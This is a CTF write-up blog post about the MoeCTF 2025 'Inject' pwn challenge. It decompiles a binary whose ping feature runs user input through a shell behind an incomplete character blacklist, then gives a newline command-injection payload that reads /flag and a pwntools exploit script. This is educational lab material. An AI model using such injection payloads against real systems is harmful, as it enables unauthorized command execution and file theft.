---
title: 'XiDianCTF MoeCTF 2025 PWN Inject'
date: '2026-09-04T20:41:23+08:00'
lastmod: '2026-09-04T20:41:23+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=962)

As usual, open the binary in Interactive Disassembler Professional (IDA Pro).

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-2Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-28h]

  v5 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  puts("Welcome to server maintainance system.");
  while ( 1 )
  {
    _printf_chk(
      1LL,
      "1. List processes\n2. Check disk usage\n3. Check network activity\n4. Test connectivity\n5. Exit\nYour choice: ");
    if ( (int)_isoc99_scanf("%u", &v4) < 0 )
      break;
    getc(stdin);
    switch ( v4 )
    {
      case 1:
        execute("ps aux");
        break;
      case 2:
        execute("df -h");
        break;
      case 3:
        execute("netstat -ant");
        break;
      case 4:
        ping_host();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
  exit(1);
}
```

The `ping_host()` function stands out.

```c
unsigned __int64 ping_host()
{
  size_t v0; // rax
  unsigned __int64 result; // rax
  char v2; // [rsp+1h] [rbp-51h]
  __int64 buf[2]; // [rsp+2h] [rbp-50h] BYREF
  char command[40]; // [rsp+12h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+3Ah] [rbp-18h]

  v5 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  _printf_chk(1LL, "Enter host to ping: ");
  if ( read(0, buf, 0xFuLL) <= 0 )
    exit(1);
  v0 = strlen((const char *)buf);
  if ( *(&v2 + v0) == 10 )
    *(&v2 + v0) = 0;
  if ( check((const char *)buf) )
  {
    _snprintf_chk(command, 32LL, 1LL, 32LL, "ping %s -c 4", (const char *)buf);
    execute(command);
  }
  else
  {
    puts("Invalid hostname or IP!");
  }
  result = v5 - __readfsqword(0x28u);
  if ( result )
    _stack_chk_fail();
  return result;
}
```

Clearly, we need to craft an input that retrieves the flag.

First, examine the `check()` function.

```c
_BOOL8 __fastcall check(const char *a1)
{
  return strpbrk(a1, ";&|><$(){}[]'\"`\\!~*") == 0LL;
}
```



We therefore need a file-reading command that can tolerate the trailing `-c 4` arguments.

We can use `\n` to separate commands.

> Note that `cat --` forces the following arguments to be treated as filenames.

Thus, the payload is `1\ncat -- /flag`.



Pwntools script:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 49821)

io.sendline(b'4')

io.send(b'1\ncat -- /flag')

io.interactive()
```

Output:

```
Welcome to server maintainance system.
1. List processes
2. Check disk usage
3. Check network activity
4. Test connectivity
5. Exit
Your choice: Enter host to ping: Executing command: ping 1
cat -- /flag -c 4
sh: 1: ping: not found
moectf{THIS_IS_FLAG}
cat: -c: No such file or directory
cat: 4: No such file or directory
Something went wrong.

1. List processes
2. Check disk usage
3. Check network activity
4. Test connectivity
5. Exit
Your choice:
```

